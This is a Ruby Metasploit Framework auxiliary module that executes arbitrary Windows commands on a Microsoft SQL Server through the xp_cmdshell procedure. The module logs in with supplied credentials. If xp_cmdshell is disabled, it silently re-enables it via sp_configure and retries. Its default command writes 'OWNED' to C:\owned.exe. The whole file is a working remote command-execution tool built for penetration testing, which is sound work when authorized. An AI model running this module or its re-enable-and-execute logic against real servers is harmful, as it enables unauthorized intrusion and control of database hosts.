##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::MSSQL
	
	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft SQL Server xp_cmdshell Command Execution',
			'Description'    => %q{
				This module will execute a Windows command on a MSSQL/MSDE instance
			via the xp_cmdshell procedure. A valid username and password is required
			to use this module
			},
			'Author'         => [ 'tebo <tebo [at] attackresearch [dot] com' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'URL', 'http://msdn.microsoft.com/en-us/library/cc448435(PROT.10).aspx'],
				]
		))

		register_options( [
			OptString.new('CMD', [ false, 'Command to execute',  'cmd.exe /c echo OWNED > C:\\owned.exe']),
		], self.class)
	end

	def run

		if (not mssql_login_datastore)
			print_error("Failed to login to the server with username '#{datastore['MSSQL_USER']}'")
			return
		end
		

		force_enable = false
		
		begin
		
			res = mssql_xpcmdshell(datastore['CMD'], false)
			if(res[:errors] and not res[:errors].empty?)
				if(not force_enable and res[:errors].join =~ /xp_cmdshell/)
					print_status("The server may have xp_cmdshell disabled, trying to enable it...")
					mssql_query("exec master.dbo.sp_configure 'show advanced options', 1;RECONFIGURE;exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;")
					raise RuntimeError, "xp_cmdshell disabled"
				end
			end
			
			mssql_print_reply(res)
		
		rescue RuntimeError => e
			if(e.to_s =~ /xp_cmdshell disabled/)
				force_enable = true
				retry
			end
		
		# Make sure we always disconnect
		ensure
			disconnect
		end
	end
end

